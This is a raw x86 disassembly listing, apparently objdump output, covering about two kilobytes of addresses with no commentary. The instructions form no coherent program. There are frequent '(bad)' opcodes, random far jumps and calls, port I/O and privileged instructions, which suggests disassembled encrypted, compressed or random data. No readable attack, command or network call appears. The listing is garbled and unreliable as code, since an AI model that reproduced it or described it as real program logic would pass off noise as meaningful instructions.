  4118d0:	mov    ecx,?
  4118d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d3:	mov    esi,fs
  4118d5:	(bad)  
  4118d6:	jmp    0xeff6:0x587e96f1
  4118dd:	popf   
  4118de:	out    dx,eax
  4118df:	add    DWORD PTR [edx-0x1d1993bd],ecx
  4118e5:	test   al,0x10
  4118e7:	sub    al,0x77
  4118e9:	mov    WORD PTR [esi],ds
  4118eb:	loope  0x4118f1
  4118ed:	xor    DWORD PTR [eax],esi
  4118ef:	sbb    ch,ch
  4118f1:	add    al,BYTE PTR [ebx-0x1d]
  4118f4:	imul   ebp,DWORD PTR [edx-0x4e],0x60
  4118f8:	adc    eax,0x3663c3c2
  4118fd:	ret    0x9cea
  411900:	adc    eax,0x9acc642
  411905:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411906:	out    0xd2,eax
  411908:	xor    DWORD PTR es:[ebx+0x5f],edi
  41190c:	bound  edi,QWORD PTR [ecx-0x9]
  41190f:	mov    dh,0xc0
  411911:	mov    WORD PTR [edi-0x8],?
  411914:	inc    esp
  411915:	sbb    dh,ah
  411917:	xor    bh,bh
  411919:	cmp    DWORD PTR [edi+edi*8+0x3f],esp
  41191d:	dec    bh
  41191f:	pop    edx
  411920:	rcr    DWORD PTR [esi+0x5b],0x7a
  411924:	sub    ecx,esi
  411926:	jnp    0x4119a0
  411928:	fdivp  st(6),st
  41192a:	fbstp  TBYTE PTR [ecx-0xd]
  41192d:	jmp    0xdc333ff6
  411932:	sti    
  411933:	sub    al,0x1e
  411935:	shr    BYTE PTR [edi-0x64ad1520],0x22
  41193c:	mov    DWORD PTR [ebx+0x5df0483],ecx
  411942:	pushf  
  411943:	fucomip st,st(0)
  411945:	push   edi
  411946:	int    0x8e
  411948:	(bad)  
  411949:	fisub  WORD PTR [eax]
  41194b:	or     al,0xec
  41194d:	pop    ebx
  41194f:	stc    
  411950:	jp     0x4118f2
  411952:	dec    ecx
  411953:	stos   BYTE PTR es:[edi],al
  411954:	push   0xffffff94
  411956:	push   ds
  411957:	in     eax,0x89
  411959:	cdq    
  41195a:	dec    esi
  41195b:	(bad)  
  41195c:	out    dx,eax
  41195d:	push   0x34
  41195f:	jae    0x411978
  411961:	dec    esp
  411962:	sbb    edx,ebp
  411964:	(bad)  
  411965:	icebp  
  411966:	and    BYTE PTR [ecx+0x389a70fc],al
  41196c:	mov    edi,0xc580176c
  411971:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411972:	push   0x69dc3f51
  411977:	mov    ebp,0x24ce1bd8
  41197c:	jmp    0xa2edd72d
  411981:	test   esp,ecx
  411983:	scas   al,BYTE PTR es:[edi]
  411984:	cld    
  411985:	fld    DWORD PTR [ecx-0x52]
  411988:	or     DWORD PTR [esi+edx*4],eax
  41198b:	fs sub ebx,ecx
  41198e:	inc    si
  411990:	mov    edi,0x78d77e43
  411995:	dec    ebp
  411996:	stc    
  411997:	bound  ebp,QWORD PTR [edx+0x53a1a9dd]
  41199d:	addr16 jge 0x41198f
  4119a0:	mov    DWORD PTR [ebx+0x3571e441],esp
  4119a6:	push   ecx
  4119a7:	mov    al,ds:0x588c2580
  4119ac:	daa    
  4119ad:	push   ecx
  4119ae:	or     edx,DWORD PTR [eax]
  4119b0:	sbb    eax,0x3c992315
  4119b5:	fist   WORD PTR [edi-0x26e4e3d0]
  4119bb:	out    dx,eax
  4119bc:	sbb    DWORD PTR [ecx-0xa53e906],esp
  4119c2:	or     eax,0x3c988caf
  4119c7:	scas   al,BYTE PTR es:[edi]
  4119c8:	mov    ds:0xc4a5eb9a,eax
  4119cd:	fprem  
  4119cf:	lahf   
  4119d0:	and    al,0x8c
  4119d2:	push   0x593af29e
  4119d7:	mov    ebp,0x51090b23
  4119dc:	and    BYTE PTR [ebx+0x6ae25489],0x58
  4119e3:	pusha  
  4119e4:	mov    eax,0x6b921f44
  4119e9:	(bad)  [eax+0x670cb0cd]
  4119ef:	int3   
  4119f0:	adc    cl,BYTE PTR [edi-0x55892e5]
  4119f6:	mov    ch,0x7c
  4119f8:	mov    eax,ds:0x81f7791
  4119fd:	xor    al,0x5e
  4119ff:	stos   BYTE PTR es:[edi],al
  411a00:	add    DWORD PTR [ebx-0x797d6a8c],edx
  411a06:	ja     0xea969cbc
  411a0c:	mov    eax,0xfe3e2e41
  411a11:	jbe    0x411a40
  411a13:	ss fcomip st,st(4)
  411a16:	sub    cl,BYTE PTR [ebp-0x717d62ea]
  411a1c:	cmp    eax,0x25a418cf
  411a21:	bound  edx,QWORD PTR [edx]
  411a23:	push   ebx
  411a24:	call   FWORD PTR [ecx+ebp*4+0x2b]
  411a28:	retf   
  411a29:	mov    ds:0xb58a9467,al
  411a2e:	push   0x14f14c13
  411a33:	inc    ebp
  411a34:	cld    
  411a35:	pop    ebx
  411a36:	imul   edx,ecx,0xffffff8d
  411a39:	aas    
  411a3a:	mov    bh,0x5a
  411a3c:	int3   
  411a3d:	jp     0x4119e7
  411a3f:	mov    bh,bh
  411a41:	(bad)  
  411a42:	lahf   
  411a43:	add    eax,DWORD PTR [ecx-0x79]
  411a46:	sub    DWORD PTR [edx],esp
  411a48:	lods   eax,DWORD PTR ds:[esi]
  411a49:	rcr    DWORD PTR [esi+eax*4-0x6d],cl
  411a4d:	data16 sub al,BYTE PTR [edx+0x6d0413c8]
  411a54:	and    BYTE PTR [edi],0x89
  411a57:	out    0x24,eax
  411a59:	loope  0x4119df
  411a5b:	daa    
  411a5c:	arpl   WORD PTR [esi+0x64],bp
  411a5f:	pop    ds
  411a60:	adc    BYTE PTR [edx+0x5ee1e65f],0xad
  411a67:	ja     0x411a39
  411a69:	and    al,0xd1
  411a6b:	dec    ebp
  411a6c:	cld    
  411a6d:	ins    BYTE PTR es:[edi],dx
  411a6e:	or     DWORD PTR [edi+0x43b78f04],eax
  411a74:	jbe    0x411aa8
  411a76:	add    eax,0xf359b201
  411a7b:	mov    cs,WORD PTR [ecx]
  411a7d:	sar    DWORD PTR [edi],0xe6
  411a80:	dec    ecx
  411a81:	xchg   edx,eax
  411a82:	pushf  
  411a83:	iret   
  411a84:	mov    cl,0xb0
  411a86:	sub    bl,ch
  411a88:	pusha  
  411a89:	cmp    BYTE PTR [edi+0x8],ch
  411a8c:	ins    BYTE PTR es:[edi],dx
  411a8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a8e:	xlat   BYTE PTR ds:[ebx]
  411a8f:	sub    DWORD PTR ds:0x9e4e981a,esi
  411a95:	mov    ah,0x24
  411a97:	jo     0x411a9b
  411a99:	(bad)  
  411a9a:	jl     0x411b0e
  411a9c:	imul   edi,DWORD PTR [ebx-0x438120b6],0x41
  411aa3:	xor    bl,BYTE PTR [edi-0x4ed400d6]
  411aa9:	pop    DWORD PTR [ecx-0x1d73b84f]
  411aaf:	lahf   
  411ab0:	ins    DWORD PTR es:[edi],dx
  411ab1:	cmp    al,0xf6
  411ab3:	leave  
  411ab4:	stc    
  411ab5:	shl    DWORD PTR [esi-0x56],cl
  411ab8:	or     al,al
  411aba:	push   0xffffffae
  411abc:	mov    dl,0x91
  411abe:	adc    edi,DWORD PTR [esi-0x78bf03de]
  411ac4:	xchg   edi,eax
  411ac5:	ins    BYTE PTR es:[edi],dx
  411ac6:	xchg   DWORD PTR [ebx],ecx
  411ac8:	or     edx,DWORD PTR [eax+0x4173c1cf]
  411ace:	std    
  411acf:	rcr    DWORD PTR [edi],0x31
  411ad2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ad3:	ret    
  411ad4:	ins    DWORD PTR es:[edi],dx
  411ad5:	pop    ecx
  411ad6:	mov    eax,0x58bbe6de
  411adb:	dec    edx
  411adc:	pusha  
  411add:	mov    bl,cl
  411adf:	push   ebp
  411ae0:	mul    ecx
  411ae2:	cmp    al,0x7b
  411ae4:	repz fdivr QWORD PTR ds:0x8d3387a5
  411aeb:	cmp    eax,0xe330c2b3
  411af0:	jge    0x411ad7
  411af2:	ss stos BYTE PTR es:[edi],al
  411af4:	and    cl,BYTE PTR [edi+0x7672b27]
  411afa:	daa    
  411afb:	fist   WORD PTR [esi+0x5b846ecb]
  411b01:	inc    esp
  411b02:	jbe    0x411b4b
  411b04:	mov    DWORD PTR [edx+ecx*4-0x51],edx
  411b08:	add    BYTE PTR [esi-0x3d],0xca
  411b0c:	int    0x73
  411b0e:	in     al,dx
  411b0f:	mov    esp,0x88635b20
  411b14:	inc    ecx
  411b15:	sub    eax,0xbce81f66
  411b1a:	cs loopne 0x411b62
  411b1d:	push   ebp
  411b1e:	(bad)  
  411b1f:	dec    esp
  411b20:	xor    BYTE PTR [ebx],dl
  411b22:	add    ch,bl
  411b24:	or     eax,DWORD PTR [ebx]
  411b26:	test   al,0x4e
  411b28:	imul   ecx,DWORD PTR [ebp+0x42],0x4038fe1b
  411b2f:	pop    edx
  411b30:	cmp    esp,ebp
  411b32:	cli    
  411b33:	and    esi,0xa101e2bc
  411b39:	std    
  411b3a:	bound  eax,QWORD PTR [edx+ebp*2]
  411b3d:	stc    
  411b3e:	mov    eax,ds:0x310a75b4
  411b43:	push   0x1d
  411b45:	outs   dx,BYTE PTR ds:[esi]
  411b46:	ror    ch,1
  411b48:	(bad)  
  411b4a:	lods   eax,DWORD PTR ds:[esi]
  411b4b:	je     0x411b27
  411b4d:	adc    esi,0xdcef75a4
  411b53:	nop
  411b54:	jmp    0x53a4:0xee51d78c
  411b5b:	dec    esi
  411b5c:	pusha  
  411b5d:	inc    eax
  411b5e:	in     al,0xe
  411b60:	retf   
  411b61:	lods   al,BYTE PTR ds:[esi]
  411b62:	jp     0x411b10
  411b64:	lahf   
  411b65:	ret    0x2a86
  411b68:	mov    edi,0xa7a406dd
  411b6d:	inc    ecx
  411b6e:	adc    BYTE PTR [ebp-0x54],0x33
  411b72:	fcom   QWORD PTR ds:0x27d40f37
  411b78:	push   ds
  411b79:	and    edx,DWORD PTR fs:0x7a52f58f
  411b80:	stos   DWORD PTR es:[edi],eax
  411b81:	nop
  411b82:	jg     0x411b4a
  411b84:	les    esi,FWORD PTR [edi-0x4cdbec5a]
  411b8a:	inc    esi
  411b8b:	inc    edx
  411b8c:	jo     0x411b9d
  411b8e:	repnz scas al,BYTE PTR es:[edi]
  411b90:	test   BYTE PTR [ecx],bh
  411b92:	ss pop esi
  411b94:	cdq    
  411b95:	ds dec edi
  411b97:	pop    eax
  411b98:	sbb    BYTE PTR [ebp+0x152b2c23],ch
  411b9e:	and    ah,BYTE PTR [edi+0x4be8d9e6]
  411ba4:	cld    
  411ba5:	into   
  411ba6:	sub    eax,0xd1b46837
  411bab:	imul   eax,DWORD PTR [edx+0x17],0xffffff89
  411baf:	icebp  
  411bb0:	jp     0x411c27
  411bb2:	outs   dx,DWORD PTR ds:[esi]
  411bb3:	idiv   DWORD PTR [esi+0x5284ba8a]
  411bb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bba:	popa   
  411bbb:	(bad)  [ebp+0x3e]
  411bbe:	mov    BYTE PTR [eax-0x54],cl
  411bc1:	cld    
  411bc2:	fistp  DWORD PTR [ecx+0x2]
  411bc5:	outs   dx,DWORD PTR ds:[esi]
  411bc6:	inc    ecx
  411bc7:	(bad)
  411bca:	repnz mov bl,0x93
  411bcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bce:	enter  0xaf2d,0x39
  411bd2:	sub    ch,ch
  411bd4:	jno    0x411bce
  411bd6:	div    DWORD PTR [ecx+0x21cedcf8]
  411bdc:	push   esi
  411bdd:	or     cl,bl
  411bdf:	mov    al,BYTE PTR [edi+0x4c]
  411be2:	mov    dh,0x35
  411be4:	loop   0x411bf6
  411be6:	inc    esp
  411be7:	push   cs
  411be8:	js     0x411c68
  411bea:	iret   
  411beb:	sub    ah,BYTE PTR [ecx-0x1a35a268]
  411bf1:	loopne 0x411bea
  411bf3:	hlt    
  411bf4:	sbb    al,0xb5
  411bf6:	syscall 
  411bf8:	inc    esi
  411bf9:	sub    ebx,DWORD PTR [ebx]
  411bfb:	(bad)  
  411bfc:	jecxz  0x411bde
  411bfe:	dec    ecx
  411bff:	jae    0x411c2c
  411c01:	inc    ebx
  411c02:	lahf   
  411c03:	push   cs
  411c04:	xor    DWORD PTR [ebp-0x65],ecx
  411c07:	fsub   DWORD PTR [edx]
  411c09:	pop    esp
  411c0a:	ja     0x411be9
  411c0c:	(bad)  
  411c0d:	cwde   
  411c0e:	mov    eax,0xd6ea8722
  411c13:	pop    edx
  411c14:	fs jns 0x411c46
  411c17:	scas   eax,DWORD PTR es:[edi]
  411c18:	rol    DWORD PTR [edi+0x347b6296],1
  411c1e:	test   BYTE PTR [ebx],dh
  411c20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c21:	pop    edx
  411c22:	add    eax,0x24ee89ee
  411c27:	add    DWORD PTR [edx-0x680b25ca],ebp
  411c2d:	and    BYTE PTR [esi],dh
  411c2f:	mov    ah,0xe1
  411c31:	mov    cl,0xc1
  411c33:	es adc al,0x1
  411c36:	dec    edi
  411c37:	or     dl,BYTE PTR [ebx]
  411c39:	fs aam 0x97
  411c3c:	mov    dh,0xd5
  411c3e:	cmp    ebx,DWORD PTR [edx+eiz*8-0x5d]
  411c42:	mov    bl,0xac
  411c44:	push   es
  411c45:	sub    dl,dh
  411c47:	test   DWORD PTR [edx+0x1610d74f],edi
  411c4d:	adc    ah,0xf3
  411c50:	sub    BYTE PTR [esi+0x41794583],dh
  411c56:	scas   al,BYTE PTR es:[edi]
  411c57:	add    DWORD PTR [edi+0x57],ebp
  411c5a:	out    dx,eax
  411c5b:	jecxz  0x411caa
  411c5d:	enter  0xb3f8,0x13
  411c61:	out    0x5c,al
  411c63:	add    edi,edx
  411c65:	retf   
  411c66:	pop    esp
  411c67:	neg    DWORD PTR [ecx]
  411c69:	add    eax,0x54820d5f
  411c6e:	jmp    0x2434:0x5252e3bb
  411c75:	ss xchg dl,ch
  411c78:	sbb    eax,0x68a9b554
  411c7d:	jns    0x411c0d
  411c7f:	addr16 xchg edx,eax
  411c81:	jbe    0x411cc2
  411c83:	sbb    DWORD PTR [ebx],0xed8ca8af
  411c89:	mov    ch,0xe9
  411c8b:	test   BYTE PTR [ebx+0x6a665a2a],dl
  411c91:	inc    ebx
  411c92:	enter  0xeca9,0x53
  411c96:	sub    DWORD PTR [ebp+0x14d57182],0xe1806fa3
  411ca0:	fadd   QWORD PTR ds:0xf97efcb8
  411ca6:	push   eax
  411ca7:	add    eax,0xf92d6d96
  411cac:	pushf  
  411cad:	stos   BYTE PTR es:[edi],al
  411cae:	xchg   edx,eax
  411caf:	pusha  
  411cb0:	jae    0x411c9e
  411cb2:	std    
  411cb3:	xchg   edx,eax
  411cb4:	mov    bh,0x4a
  411cb6:	mov    dl,0x66
  411cb8:	sub    eax,0x1b1a6bab
  411cbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411cbe:	and    al,0x48
  411cc0:	imul   ecx,edi,0x3b8ca75a
  411cc6:	or     al,0xf1
  411cc8:	mov    edx,0x94fd81a1
  411ccd:	ds inc esp
  411ccf:	outs   dx,BYTE PTR ds:[esi]
  411cd0:	loope  0x411c75
  411cd2:	out    dx,eax
  411cd3:	sbb    DWORD PTR [eax+0x3200da7c],ebp
  411cd9:	out    dx,eax
  411cda:	mov    ecx,DWORD PTR [esi+0x34751667]
  411ce0:	in     al,dx
  411ce1:	xchg   BYTE PTR [eax-0x5479a9a0],ah
  411ce7:	ret    
  411ce8:	push   edi
  411ce9:	xor    DWORD PTR [edi],eax
  411ceb:	repz jb 0x411cfa
  411cee:	push   edi
  411cef:	daa    
  411cf0:	call   0x4e9f:0x43ef58a7
  411cf7:	mov    eax,ds:0xc7a5363e
  411cfc:	cmp    al,0x39
  411cfe:	out    dx,al
  411cff:	mov    WORD PTR [eax+ebx*4],?
  411d02:	xor    edx,DWORD PTR [esi]
  411d04:	cmc    
  411d05:	sub    al,0xad
  411d07:	in     al,0xca
  411d09:	xor    esi,DWORD PTR [edx]
  411d0b:	iret   
  411d0c:	das    
  411d0d:	fcom   QWORD PTR [eax-0x1c]
  411d10:	iret   
  411d11:	lods   al,BYTE PTR ds:[esi]
  411d12:	hlt    
  411d13:	pop    esp
  411d14:	sub    eax,0x5060ee2a
  411d19:	in     eax,dx
  411d1a:	adc    al,0xe2
  411d1c:	cmp    ah,ah
  411d1e:	shl    DWORD PTR es:[esi-0x3c717307],cl
  411d25:	cmp    al,0x8
  411d27:	xor    ah,BYTE PTR [esi+ebp*8]
  411d2a:	pop    edi
  411d2b:	and    DWORD PTR [esi-0x48e87f30],esi
  411d31:	in     eax,0xc8
  411d33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d34:	fdivr  QWORD PTR [ebp+edx*4+0x4caf698]
  411d3b:	into   
  411d3c:	and    BYTE PTR [esi-0x1],cl
  411d3f:	mov    eax,0x1c0750eb
  411d44:	push   ebx
  411d45:	push   ebx
  411d46:	jg     0x411d6c
  411d48:	mov    ebp,0xe17b1a30
  411d4d:	ins    BYTE PTR es:[edi],dx
  411d4e:	xchg   BYTE PTR [esp+ebx*1],cl
  411d51:	jns    0x411da6
  411d53:	pop    ecx
  411d54:	sub    BYTE PTR [edx-0x61],ah
  411d57:	mov    cl,BYTE PTR [esi]
  411d59:	out    dx,al
  411d5a:	loope  0x411d56
  411d5c:	pusha  
  411d5d:	jbe    0x411d42
  411d5f:	pop    ecx
  411d60:	dec    esp
  411d61:	(bad)  
  411d62:	lahf   
  411d63:	inc    ecx
  411d64:	(bad)
  411d67:	repnz push esp
  411d69:	hlt    
  411d6a:	sbb    bh,BYTE PTR [eax+eiz*4-0x61125648]
  411d71:	cmp    al,0x4f
  411d73:	xchg   edi,eax
  411d74:	mov    esp,0x41416cb2
  411d79:	mov    edx,0x2303a95a
  411d7e:	cmp    BYTE PTR [edi-0x26],0x83
  411d82:	dec    ebx
  411d83:	jmp    0x411da0
  411d85:	fidivr WORD PTR [ebp+0x1f]
  411d88:	(bad)  
  411d8a:	into   
  411d8b:	lea    esp,[ebp+0x11]
  411d8e:	cs xor eax,0xf986ecb5
  411d94:	mov    ebp,0xa099f065
  411d99:	ror    DWORD PTR [ebx],0x16
  411d9c:	jnp    0x411d40
  411d9e:	xchg   BYTE PTR [edx],cl
  411da0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411da1:	add    bl,BYTE PTR [edi+0x7ac519e0]
  411da7:	scas   eax,DWORD PTR es:[edi]
  411da8:	push   ebx
  411da9:	inc    ebp
  411daa:	pop    es
  411dab:	and    eax,edi
  411dad:	add    edx,0xf765d1ca
  411db3:	cmp    eax,0xf1328a40
  411db8:	or     ah,BYTE PTR [ecx+0x61]
  411dbb:	xor    BYTE PTR [eax+0x2337ad35],bh
  411dc1:	or     DWORD PTR ds:0x5ef03738,ebx
  411dc7:	mov    ecx,0x9e19aa4a
  411dcc:	and    dh,BYTE PTR [ecx+esi*4+0x7f]
  411dd0:	add    DWORD PTR ds:0x3c03a211,esi
  411dd6:	int3   
  411dd7:	pop    esi
  411dd8:	cmp    eax,0x1fb186a8
  411ddd:	mov    dh,0x8d
  411ddf:	adc    BYTE PTR [edi+0x5d3e126d],ah
  411de5:	mov    al,0xe7
  411de7:	cwde   
  411de8:	stos   DWORD PTR es:[edi],eax
  411de9:	cmp    al,0x9a
  411deb:	in     al,dx
  411dec:	in     al,dx
  411ded:	sahf   
  411dee:	push   0xcfe26d5e
  411df3:	dec    esi
  411df4:	fwait
  411df5:	add    al,0x67
  411df7:	stos   BYTE PTR es:[edi],al
  411df8:	inc    edi
  411df9:	add    eax,0x85d238f9
  411dfe:	adc    DWORD PTR [ebx+0x21],edi
  411e01:	pop    ebx
  411e02:	stc    
  411e03:	cmp    DWORD PTR [ecx+0x4c],esi
  411e06:	and    DWORD PTR [ebp-0x6d6cdba2],0x4
  411e0d:	jo     0x411e39
  411e0f:	xchg   edx,eax
  411e10:	inc    eax
  411e11:	push   esi
  411e12:	imul   ebx,DWORD PTR [ecx+0x3d],0xffffffc7
  411e16:	in     al,dx
  411e17:	sbb    al,0x2c
  411e19:	jb     0x411ddd
  411e1b:	enter  0xb5fc,0x44
  411e1f:	(bad)  
  411e20:	xor    eax,0xbcf0b6ee
  411e25:	xchg   ecx,eax
  411e26:	xchg   BYTE PTR [eax-0x25],bh
  411e29:	xor    al,0x8d
  411e2b:	(bad)  
  411e2c:	mov    al,0x54
  411e2e:	cli    
  411e2f:	inc    ebp
  411e30:	cli    
  411e31:	xchg   esp,eax
  411e32:	mov    dl,0xc3
  411e34:	mov    ah,0x50
  411e36:	jl     0x411dde
  411e38:	sbb    BYTE PTR [ebp-0x4d],0xfc
  411e3c:	or     al,0x7c
  411e3e:	cmc    
  411e3f:	fild   QWORD PTR [ebp-0x4e11e6dd]
  411e45:	xor    eax,0x3ecda85a
  411e4a:	ins    DWORD PTR es:[edi],dx
  411e4b:	mov    esp,0x9d287df9
  411e50:	inc    edi
  411e51:	add    eax,0xd57b7ee1
  411e56:	fwait
  411e57:	or     DWORD PTR [edi+ebx*1+0x28],0xffffffc1
  411e5c:	cmp    BYTE PTR [ecx+eax*4+0x7a8984fb],bl
  411e63:	adc    al,0xd2
  411e65:	or     dh,al
  411e67:	sub    DWORD PTR [ebp+0x66],0x3b
  411e6b:	xchg   esi,eax
  411e6c:	sar    esp,cl
  411e6e:	and    BYTE PTR [edi+0x43a5958e],bh
  411e74:	mov    eax,ds:0x55ad0d11
  411e79:	pop    edi
  411e7a:	add    esi,esi
  411e7c:	mov    dl,0xa0
  411e7e:	push   ebp
  411e7f:	xor    BYTE PTR [ebp-0x46],dh
  411e82:	add    ah,BYTE PTR [edx-0x1f]
  411e85:	xchg   DWORD PTR [edi+0x6e21ef46],ecx
  411e8b:	cmp    al,0x22
  411e8d:	xchg   esp,eax
  411e8e:	sbb    esp,DWORD PTR [edx-0x45d0acc9]
  411e94:	sub    DWORD PTR [ecx-0x63c8cfe1],esp
  411e9a:	stos   DWORD PTR es:[edi],eax
  411e9b:	mov    BYTE PTR [edi-0x53],bl
  411e9e:	cmp    edi,ebx
  411ea0:	std    
  411ea1:	fcmovbe st,st(7)
  411ea3:	mov    dl,0xb0
  411ea5:	mul    DWORD PTR [ecx+0x33]
  411ea8:	xchg   ecx,eax
  411ea9:	mov    eax,0xe9cfeb6a
  411eae:	retf   0x565
  411eb1:	push   esi
  411eb2:	imul   edi,DWORD PTR [eax+0x339fb56c],0x21
  411eb9:	mov    edi,0x96c8be51
  411ebe:	scas   al,BYTE PTR es:[edi]
  411ebf:	in     al,dx
  411ec0:	(bad)  
  411ec1:	ins    BYTE PTR es:[edi],dx
  411ec2:	bnd ja 0x411ef2
  411ec5:	idiv   DWORD PTR [ebp+0xb74d701]
  411ecb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ecc:	sbb    eax,0x6273c6f3
  411ed1:	dec    ecx
  411ed2:	sahf   
  411ed3:	mov    ebx,edi
  411ed5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ed6:	sub    eax,0x7da912b7
  411edb:	int    0xda
  411edd:	call   0xe0ec:0xd64331df
  411ee4:	jmp    0x48d6ea90
  411ee9:	ds inc eax
  411eeb:	jae    0x411f15
  411eed:	aas    
  411eee:	fs xor eax,0x84ff0908
  411ef4:	xchg   BYTE PTR [edi*8-0x744d21f0],dl
  411efb:	into   
  411efc:	leave  
  411efd:	sub    eax,0xa4472e7d
  411f02:	dec    edx
  411f03:	paddb  mm7,QWORD PTR [edi-0x3ce1b145]
  411f0a:	xor    eax,0xdc030874
  411f0f:	and    eax,0xfa98ae69
  411f14:	enter  0x92b9,0x53
  411f18:	popa   
  411f19:	mov    DWORD PTR [edi+edx*8],ebx
  411f1c:	add    esp,DWORD PTR [edx-0x7e272eef]
  411f22:	ficom  WORD PTR [esi-0x49]
  411f25:	adc    cl,cl
  411f27:	inc    esi
  411f28:	retf   0x9883
  411f2b:	cld    
  411f2c:	(bad)  
  411f2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f2e:	scas   al,BYTE PTR es:[edi]
  411f2f:	fst    DWORD PTR [ebx-0x14141e2a]
  411f35:	nop
  411f36:	dec    edx
  411f37:	xor    eax,0xc05b4c69
  411f3c:	sbb    eax,0xfa205f50
  411f41:	dec    eax
  411f42:	jae    0x411f40
  411f44:	mov    al,ds:0x9bb87439
  411f49:	mov    ds:0x523fef79,eax
  411f4e:	test   ecx,0xa62c2100
  411f54:	adc    bh,al
  411f56:	sti    
  411f57:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411f58:	and    al,0xe4
  411f5a:	out    dx,eax
  411f5b:	div    BYTE PTR [esi-0x74]
  411f5e:	hlt    
  411f5f:	mov    ah,0xe3
  411f61:	mov    cl,0xf1
  411f63:	std    
  411f64:	outs   dx,DWORD PTR ds:[esi]
  411f65:	mov    al,0x34
  411f67:	bound  eax,QWORD PTR [edi+0x2cae9aab]
  411f6d:	pop    ebp
  411f6e:	jne    0x411f74
  411f70:	jno    0x411fec
  411f72:	adc    esi,edi
  411f74:	or     al,0x86
  411f76:	pop    edi
  411f77:	fidivr DWORD PTR [ebx+0x13cf8f8d]
  411f7d:	in     al,0xc8
  411f7f:	cmp    ebx,esi
  411f81:	xor    dl,BYTE PTR [edi+0x6143ac1c]
  411f87:	dec    ebx
  411f88:	xlat   BYTE PTR ds:[ebx]
  411f89:	mov    DWORD PTR [ebx-0x41b0c9e],esp
  411f8f:	in     eax,0xa6
  411f91:	push   edx
  411f92:	cmp    edx,DWORD PTR [eax]
  411f94:	and    eax,0xffa9bfb3
  411f99:	fcomp  QWORD PTR [esi+ebx*4-0x41]
  411f9d:	xor    eax,0x409d0605
  411fa2:	and    BYTE PTR [ebx-0x3],0x7a
  411fa6:	daa    
  411fa7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411fa8:	mov    dl,0x54
  411faa:	add    dh,0x82
  411fad:	push   ds
  411fae:	icebp  
  411faf:	cmp    BYTE PTR [ebx+esi*2],bh
  411fb2:	and    eax,0x3d8593fc
  411fb7:	push   eax
  411fb9:	dec    ecx
  411fba:	xchg   DWORD PTR [edi],esp
  411fbc:	xchg   esi,eax
  411fbd:	mov    al,0x43
  411fbf:	dec    esp
  411fc0:	or     dl,dh
  411fc2:	push   esp
  411fc3:	pop    esp
  411fc4:	dec    esi
  411fc5:	into   
  411fc6:	or     eax,0x9963cc6e
  411fcb:	imul   edi,DWORD PTR [esi-0xbe9d696],0x914ee3b6
  411fd5:	xchg   edx,eax
  411fd6:	ror    BYTE PTR [ebp+0x20],cl
  411fd9:	in     eax,0xc0
  411fdb:	loope  0x412045
  411fdd:	pop    ds
  411fde:	xor    eax,0x9a89e42a
  411fe3:	mov    DWORD PTR [ecx-0x30e51681],0xfa96b5aa
  411fed:	sub    al,0x1f
  411fef:	pop    edi
  411ff0:	hlt    
  411ff1:	push   ebx
  411ff2:	outs   dx,BYTE PTR ds:[esi]
  411ff3:	in     al,dx
  411ff4:	call   0xba05:0x1df7b2cc
  411ffb:	sti    
  411ffc:	mov    eax,ds:0x69f227cf
  412001:	jmp    0xc4437bbc
  412006:	pop    edx
  412007:	jb     0x41206e
  412009:	ins    BYTE PTR es:[edi],dx
  41200a:	sbb    BYTE PTR [ecx+0x26ddb7d5],bh
  412010:	out    0x24,al
  412012:	dec    eax
  412013:	add    dl,BYTE PTR [ebp+0x77979414]
  412019:	add    ch,dl
  41201b:	cli    
  41201c:	fstp   TBYTE PTR [ecx-0x7f348fe5]
  412022:	call   0xc6bd:0xe855d36
  412029:	jmp    FWORD PTR [ebp-0x43d4fc0c]
  41202f:	je     0x411fe8
  412031:	hlt    
  412032:	stos   DWORD PTR es:[edi],eax
  412033:	test   eax,0xc8902348
  412038:	mov    eax,ds:0xeccfdc9
  41203d:	out    dx,al
  41203e:	mov    esp,DWORD PTR [edi-0x657c1deb]
  412044:	pop    edi
  412045:	and    ebx,esi
  412047:	and    eax,0xd7310417
  41204c:	fbstp  TBYTE PTR [edx-0x65156f9e]
  412052:	mov    ds:0xa4699dba,eax
  412057:	loope  0x41206e
  412059:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41205a:	xchg   edx,eax
  41205b:	jo     0x412075
  41205d:	lods   eax,DWORD PTR ds:[esi]
  41205e:	in     al,dx
  41205f:	stos   DWORD PTR es:[edi],eax
  412060:	lods   eax,DWORD PTR ds:[esi]
  412061:	dec    ecx
  412062:	aaa    
  412063:	jle    0x412001
  412065:	sub    BYTE PTR [ecx+ebp*4+0x5ddda4dd],dh
  41206c:	(bad)  
  41206d:	sti    
  41206e:	pop    ecx
  41206f:	fisubr WORD PTR [ebp+ebx*4+0x2156cbef]
  412076:	sbb    eax,0x57f8475a
  41207b:	jmp    0x11c3:0x7ea63ed1
  412082:	nop
  412083:	ins    BYTE PTR es:[edi],dx
  412084:	outs   dx,DWORD PTR ds:[esi]
  412085:	cmc    
  412086:	pop    esp
  412087:	mov    bl,0x8d
  412089:	jg     0x412093
  41208b:	or     bh,BYTE PTR [ecx-0x32]
  41208e:	dec    edi
  41208f:	or     DWORD PTR [eax],0x275ac7c1
  412095:	int3   
  412096:	jo     0x412096
  412098:	inc    ecx
  412099:	(bad)  
  41209a:	mov    ds:0x58f3384d,al
  41209f:	arpl   bp,sp
  4120a1:	rol    DWORD PTR [ecx+0x6643ea26],0x77
  4120a8:	adc    BYTE PTR [edi+0x9],dh
  4120ab:	xchg   BYTE PTR [edi-0x1f],ch
  4120ae:	adc    esp,DWORD PTR [edx]
  4120b0:	jns    0x412041
